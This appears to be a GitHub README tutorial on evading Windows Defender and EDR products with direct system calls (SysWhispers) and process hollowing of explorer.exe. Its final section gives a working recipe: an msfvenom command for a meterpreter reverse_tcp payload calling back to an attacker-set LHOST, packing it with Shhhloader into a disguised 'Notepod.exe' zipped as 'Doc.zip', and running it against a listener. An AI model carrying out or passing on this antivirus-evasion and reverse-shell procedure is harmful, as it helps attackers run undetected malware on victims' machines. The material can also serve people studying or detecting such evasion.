# Defeat Windows Defender using direct Syscall

## Protection rings


![image](https://user-images.githubusercontent.com/76106120/151554524-e5d661f2-6d22-4051-a2bf-40367cf6ac2f.png)


Windows os as some security rings in order to avoid any one to access critical memory region.
There is the user-mode where the application are running (ring 3) and the kernel mode (ring 0) with the critical system components.
Some resources cannnot be accessed by specific application in order to prevent malicious behavior.

Application are isolated from critical memory section and system resources are running in Kernel Mode.
To make the translation between user mode and kernel mode there is an dll called ntddl.dll.
Ntddl.dll gives the right Api call perform by the user mode, thanks to that the kernel can make the right system call.

#### In the image just below, you can see how the user mode and the kernel mode interract :
 
![image](https://user-images.githubusercontent.com/76106120/151559138-3b33e231-e4a8-4af7-a561-c34278648b02.png)
 
 
The AV/EDR products knows that the sensitive spot is when the ntdll.dll give the syscall number to execute to the kernel mode.
If an AV/EDR recognize strange syscall, they will hook the API.
 
To bypass this, it is possible to make direct system call. We can execute system call without using the ntdll.dll.
This is where the SysWhisper projet will be useful to us. With syswhisper you are able to generate file Syscall.h who contain all the syscall of each windows operating system.
SysWhisper gives us all the syscall that we need for any type of os, with that we are able to make direct syscall as if they were normal Native API functions.
We do not need to pass thought the ntdll.dll, a therefore to pass under the radar of AV/EDR.

### Let's take an example :

If we want to use the NT system call CreateFile, we should call the NtCreateFile located in the ntdll.dll. But instead of this we are directly invoking SysNtCreateFile.

![image](https://user-images.githubusercontent.com/76106120/151571082-cb09f257-e154-4329-9f3f-13b1e06cc1ca.png)

 
The AV/EDR product could not hook the API because we are not using API calls, we are using direct syscall.
So the AV/EDR cannot intercept our attemps and we would have opened it succesfully 🙂

### Process Hollowing

Now that we are able to use NT system call under the radar of AV/EDR products.
We want to run our shellcode.

How it's working:

1) Create the target process (ex: explorer.exe) in a suspended state.

2) Parse the create process in order to find the EntryPoint

3) Then Write the shellcode to the EntryPoint and resume the thread execution.

 
## Shhhloader project (https://github.com/icyguider/Shhhloader):

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o tesssssst.bin
 
> ./Shhhloader.py tesssssst.bin -p explorer.exe -o Notepod.exe
 
> zip Notepod.exe Doc.zip
 
 - Drag and drop .zip in your Windows machine.
 - Start meterpreter listener and set payload to windows/x64/meterpreter/reverse_tcp (Shhhloader only support staged payload, so you have to provide it the right one !!!)
 - run the Notepod.exe
 
![image](https://user-images.githubusercontent.com/76106120/151585618-3b3790d7-e591-4c40-976e-5d8e6c5bfef4.png)

 
 
 
 




